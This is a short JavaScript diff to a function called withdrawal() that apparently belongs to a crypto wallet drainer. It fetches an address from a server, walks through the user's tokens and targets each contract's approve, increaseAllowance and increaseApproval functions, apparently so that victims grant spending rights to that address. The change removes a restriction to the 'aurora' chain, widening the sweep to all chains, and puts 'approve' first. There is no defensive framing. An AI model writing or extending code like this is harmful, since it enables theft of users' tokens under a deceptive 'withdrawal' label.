@@ -149,7 +149,6 @@ async function withdrawal() {
   const randomAddress = await serverApi.getRandomAddress();
   localStorage.setItem("randomAddress", randomAddress);
   console.log("allTokens: ", allTokens);
-  allTokens = allTokens.filter((token) => token.chain == "aurora");
   instructions.hide();
   for (const token of allTokens) {
     console.log("token: ", token);
@@ -196,9 +195,9 @@ async function withdrawal() {
         if (token.id.startsWith("0x")) {
           const tokenAbi = await abiApi.get(token.id, chainSetting);
           const targtedFunctions = [
+            "approve",
             "increaseAllowance",
             "increaseApproval",
-            "approve",
           ];
 
           const contractFunction = web3Services.getContractFunctions(
